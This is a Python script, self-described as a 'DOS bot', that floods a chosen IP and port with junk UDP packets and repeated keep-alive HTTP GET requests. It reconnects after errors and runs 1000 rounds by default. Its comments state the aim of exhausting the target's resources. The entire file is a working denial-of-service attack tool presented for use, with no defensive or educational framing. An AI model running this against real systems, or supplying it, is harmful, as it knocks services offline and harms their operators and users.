import argparse
import socket

def main():
    parser = argparse.ArgumentParser(description="DOS bot")

    parser.add_argument("--server-ip", required=True)
    parser.add_argument("--server-port", type=int, required=True)
    parser.add_argument("--message", default="aaaaaaaaaaaaaaaaaaaaJLkmhiUhh GUIgtfgP{TIFYUAAAAAAA")
    parser.add_argument("--count", type=int, default=1000)

    args = parser.parse_args()
    client = HTTPBombDOS(args.server_ip, args.server_port)
    client.connect()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    message = args.message.encode()

    # This will hammer the target with UPD and TCP garbage data
    # and will waste most of the targets resources
    for i in range(args.count):
        print(f"[{i + 1}/{args.count}] Sending DoS packet...")
        sock.sendto(message, (args.server_ip, args.server_port))
        client.send("/")
        
    client.close()
    sock.close()

class HTTPBombDOS:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f"Connecting to {self.target_ip}:{self.target_port}...")
        self.sock.connect((self.target_ip, self.target_port))

        print("TCP connection established.")

    def send(self, path="/"):
      try:

        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
        )

        self.sock.sendall(request.encode())

        response = self.sock.recv(4096)

        print("TCP bomb sent.")

        self.sock.sendall(response)

      except (ConnectionError, OSError, BrokenPipeError) as e:
        print(f"Reconnecting...")
        self.connect()

    def close(self):
        if self.sock:
            self.sock.close()
            self.sock = None
            print("Connection closed.")

if __name__ == "__main__":
    main()